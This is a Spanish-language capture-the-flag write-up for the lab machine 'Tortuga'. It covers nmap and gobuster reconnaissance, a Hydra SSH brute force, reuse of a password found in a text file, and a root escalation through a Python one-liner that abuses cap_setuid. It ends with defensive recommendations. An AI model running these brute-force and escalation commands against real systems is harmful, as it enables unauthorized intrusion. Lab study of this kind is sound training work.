# WriteUp: TheHackersLabs-Tortuga

## 📋 Resumen Ejecutivo
Máquina Linux de dificultad baja donde se explota fuerza bruta en SSH, enumeración de archivos ocultos y una vulnerabilidad de capacidades de Linux (Linux Capabilities) en Python para escalar privilegios a root.

---

## 🔍 Fase 1: Reconocimiento

### Escaneo Nmap Inicial
```bash
sudo nmap -sS -p- -sC -sV -Pn 192.168.xx
```

**Resultados:**
- **Puerto 22/TCP**: OpenSSH 9.2p1 (Debian)
- **Puerto 80/TCP**: Apache httpd 2.4.62 (Debian)
- **OS**: Linux Debian
- **Latencia**: 0.00020s (máquina local)

### Búsqueda de Vulnerabilidades
```bash
sudo nmap --script "auth,vuln" -p80,22
```

**Hallazgos:**
- ❌ No se detectaron vulnerabilidades críticas
- ✓ SSH acepta autenticación por contraseña
- ✓ HTTP sin XSS, CSRF o vulnerabilidades almacenadas evidentes

### Enumeración Web
```bash
gobuster dir -u http://192.168.xx -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
```

**Resultado:** Sin directorios interesantes encontrados (solo archivos de configuración Apache bloqueados)

---

## 🔐 Fase 2: Acceso Inicial - Fuerza Bruta SSH

### Ataque Hydra
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.xx
```

**Credenciales Obtenidas:**
```
Usuario: grumete
Contraseña: 1234
```

### Conexión SSH
```bash
ssh -p 22 grumete@192.168.xx
```

**Primera Flag:** `user.txt` encontrada en `/home/grumete/`

---

## 🗝️ Fase 3: Enumeración Post-Explotación

### Archivos Ocultos
```bash
ls -la
```

**Archivo Crítico:** `.nota.txt` (propiedad de root)

**Contenido de .nota.txt:**
```
Contraseña del usuario capitan: mar_de_fuego123
```

### Análisis de /etc/passwd
```bash
cat /etc/passwd
```

**Usuarios Interesantes:**
- `capitan:x:1001:1001::/home/capitan:/bin/bash` ← Usuario objetivo
- `grumete:x:1002:1002::/home/grumete:/bin/bash` ← Usuario actual

---

## ⬆️ Fase 4: Escalada de Privilegios

### Cambio a Usuario Capitán
```bash
su capitan
# Contraseña: mar_de_fuego123
```

### Búsqueda de Vectores de Escalada

#### 1. Verificación de Permisos Sudo
```bash
sudo -l
# Resultado: Usuario no puede ejecutar sudo
```

#### 2. Búsqueda de Binarios SUID
```bash
find / -perm -4000 2>/dev/null
```

**Resultado:** Binarios estándar de sistema (passwd, su, mount, etc.)

#### 3. **Búsqueda de Linux Capabilities** ⭐
```bash
getcap -r / 2>/dev/null
```

**HALLAZGO CRÍTICO:**
```
/usr/bin/python3.11 cap_setuid=ep
```

Python3.11 tiene la capacidad `cap_setuid` que permite cambiar el UID del proceso a 0 (root).

### Explotación de Capabilities
```bash
python3.11 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Desglose del comando:**
- `import os` → Importa módulo del sistema operativo
- `os.setuid(0)` → Cambia UID a 0 (root)
- `os.system("/bin/bash")` → Abre shell interactivo como root

### Verificación de Acceso Root
```bash
whoami
# root

cd /root
ls
# root.txt ✓
```

---

## 🎯 Resumen de Vectores de Ataque

| Fase | Técnica | Herramienta | Resultado |
|------|---------|-------------|-----------|
| 1 | Escaneo de puertos | Nmap | Puertos 22, 80 abiertos |
| 2 | Fuerza bruta SSH | Hydra | Credenciales: grumete:1234 |
| 3 | Enumeración | cat/ls | Contraseña en .nota.txt |
| 4 | Cambio de usuario | su | Acceso como capitán |
| 5 | Escalada de privilegios | Python + Capabilities | Acceso root |

---

## 🛡️ Lecciones de Seguridad

⚠️ **Vulnerabilidades Encontradas:**
1. **Contraseña débil** en SSH (1234)
2. **Credenciales almacenadas** en archivo de texto (.nota.txt)
3. **Capacidades de Linux mal configuradas** en Python (cap_setuid)
4. **Falta de protección** en archivos sensibles

✅ **Recomendaciones:**
- Usar autenticación por clave SSH
- No almacenar contraseñas en archivos de texto
- Revisar y limitar Linux Capabilities
- Implementar auditoría de permisos regularmente

---

## 🏴 Máquina Hackeada ✓

**Flags Obtenidas:**
- `user.txt` ✓
- `root.txt` ✓
